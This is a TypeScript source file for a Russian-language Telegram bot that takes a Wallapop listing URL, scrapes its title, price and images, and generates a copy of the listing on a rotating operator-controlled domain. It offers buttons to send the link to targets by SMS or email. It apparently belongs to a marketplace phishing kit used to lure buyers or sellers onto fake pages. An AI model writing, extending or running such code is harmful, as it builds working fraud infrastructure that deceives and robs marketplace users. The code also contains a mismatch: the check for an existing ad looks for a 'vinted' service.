import {Context} from "@/database/models/context";
import {Composer, InlineKeyboard, Keyboard} from "grammy";
import {Ads} from "@/database/models/ads";
import {adsRepository, domensRepository, profilesRepository, userRepository} from "@/database";
import moment from 'moment';
import {User} from "@/database/models/user";
import {getPictureMenu} from "@/helpers/getPictureMenu";
import {Scene} from "grammy-scenes";
import {deleteAllMessages} from "@/helpers/deleteAllMessages";
import {parseStringWallapop} from "@/handlers/parseUrl/wallapop/parseStringWallapop";
import {getFlagEmoji} from "@/helpers/getFlagEmoji";
import {getService} from "@/helpers/getServices";
import {Profiles} from "@/database/models/profiles";
import {getDomen} from "@/helpers/getDomen";
import console from "console";

export const composer = new Composer<Context>()
const regex = /(?<platform>\w+)\.wallapop\.com\/(?<link>.+)/gm
const regex2 = /(?<platform>\w+)\.wallapop\.com\/(?<link>.+)\?/gm
composer.hears(regex, handler)
moment.locale('ru')

async function preCreateAd(ctx, parse, match) {
    const {ads, newAd} = await createAd(parse, ctx, match)

    const domen = await getDomen(ctx.user,'wallapop')
    if (!domen) return ctx.reply('domen undefined error')

    return ctx.replyWithPhoto(await getPictureMenu(ctx.user), {
        caption:`
${(newAd) ? '🪄 Ссылка создана!' : '🪄 Ссылка была создана ранее!'}

🐨 ID объявления: <code>${ads.date}</code>

🌳 <b>Название:</b> <code>${ads.title}</code>
🌳 <b>Цена:</b> <code>${ads.price}</code>
🌳 <b>Платформа: WALLAPOP [${match[1].toUpperCase()} ${getFlagEmoji(match[1])}]</b>
♻️ <b>Домен сменён ${moment(new Date(domen.dateChange)).fromNow()}</b>
➖➖➖➖➖➖➖

💠 <b>Созданная ссылка:</b> <a href="https://${domen.link}/link/${ads.link}">LINK [2.0]</a>
`.replace('\n', ''),
        reply_markup: await createKeyboard(ads.id, ctx.user)
    })
}

const createKeyboard = async (id: Number, user: User) => {
    const keyb = new InlineKeyboard()
        // .text("🙊 Настройки", `settings ad ${id}`)

    keyb.row()

    if (user.sms > 0) {
        keyb.text("📲 SMS", `sms ad ${id}`)
    }

    if (user.email > 0) {
        keyb.text("💌 EMAIL", `email ad ${id}`)
    }

    keyb.row()
    keyb.text("⚙ Настройки", `settings ad ${id}`)
    keyb.row()
    keyb.text("Главное меню", `menuWithPicture`)

    return keyb

}
async function handler (ctx: Context) {
    const parse = await parseStringWallapop(ctx.msg.text, ctx)
    if (parse === undefined) return null
    let match = regex2.exec(ctx.msg.text)

    if (!match) {
        match = regex.exec(ctx.msg.text)
    }
    return ctx.scenes.enter('setDeliveryAmountWallapop', {
        parse, match
    })
}

async function cancel (ctx) {
    try {
        await deleteAllMessages (ctx.session.deleteMessage,ctx)
    } catch (e) {}
    ctx.scene.exit()
}

export const scene = new Scene<Context>('setDeliveryAmountWallapop')

scene.always().callbackQuery(/skip setDeliveryAmountWallapop/, async ctx => {
    // @ts-ignore
    await preCreateAd(ctx,  ctx.session.anyObject.parse, ctx.session.anyObject.match)
    return cancel(ctx)
})

scene.always().callbackQuery(/wallapop setDeliveryInAd/, async ctx => {
    // @ts-ignore
    ctx.session.anyObject.parse.detail.price = Number(parseFloat(ctx.session.anyObject.parse.detail.totalPrice)).toFixed(2)

    // @ts-ignore
    await preCreateAd(ctx, ctx.session.anyObject.parse, ctx.session.anyObject.match)
    return cancel(ctx)
})

scene.do(async (ctx) => {
    ctx.session.deleteMessage = []
    ctx.session.anyObject = ctx.scene.arg

    let keyb = []

    // @ts-ignore
    if (ctx.session.anyObject?.parse?.detail?.totalPrice !== undefined) {
        keyb.push([{text: '🔋 Использовать цену с обьявления', callback_data: 'wallapop setDeliveryInAd'}])
    }
    keyb.push([{text: 'Пропустить', callback_data: 'skip setDeliveryAmountWallapop'}])

    // @ts-ignore
    const res = await ctx.reply(`<b>💰 Цена доставки в обьявлении: <code>${Number(parseFloat(ctx.session.anyObject?.parse?.detail?.totalPrice) - parseFloat(ctx.session.anyObject?.parse?.detail?.price)).toFixed(2)} €</code></b>\n\n<b>🚚 Напиши цену доставки: </b>`, {
        reply_markup: {
            inline_keyboard: keyb
        }
    })
    ctx.session.deleteMessage.push(res.message_id)
    return ctx.scene.resume()
})

scene.wait().hears(/(^\d+\.\d\d)|(^\d+)/, async ctx => {
    try {
        ctx.deleteMessage()
    } catch (e) {}

    const userPrice = parseFloat(ctx.match[0])
    // @ts-ignore
    const price = ctx.session.anyObject.parse.detail.price = ctx.session.anyObject.parse.detail.price.replace(/\./,'')

    // @ts-ignore
    ctx.session.anyObject.parse.detail.price = (userPrice + parseFloat(price)).toFixed(2)

    console.log(ctx.match[0], userPrice, price, parseFloat(price))
    // @ts-ignore
    await preCreateAd(ctx, ctx.session.anyObject.parse, ctx.session.anyObject.match)
    return cancel(ctx)
})

const createAd = async (parse,ctx, match) => {
    const oldAd = await adsRepository.findOne({
        relations: {author: true},
        where: {
            originallink: match[2],
            country: 'es',
            service: 'vinted',
            author: {
                tgId: ctx.user.tgId
            }
        }
    })

    if (oldAd && oldAd.delete !== false) return {
        ads: oldAd,
        newAd: false
    }

    const date = Date.now()
    const ads = new Ads()

    ads.title = parse.detail.title
    ads.description = parse.detail.description
    ads.price = parse.detail.price + " €"
    ads.img = parse.detail.img
    ads.link = `${match[2]}${date}`
    ads.originallink = `${match[2]}`
    ads.date = `${date}`
    ads.country = match[1]
    ads.service = 'wallapop'
    ads.author = ctx.user
    ads.page = parse.page
    ads.pageMobile = parse.pageMobile
    ads.created = moment(Date.now()).format('YYYY-MM-DD HH:mm:ss')

    await adsRepository.save(ads)
    return {
        ads,
        newAd: true
    }
}
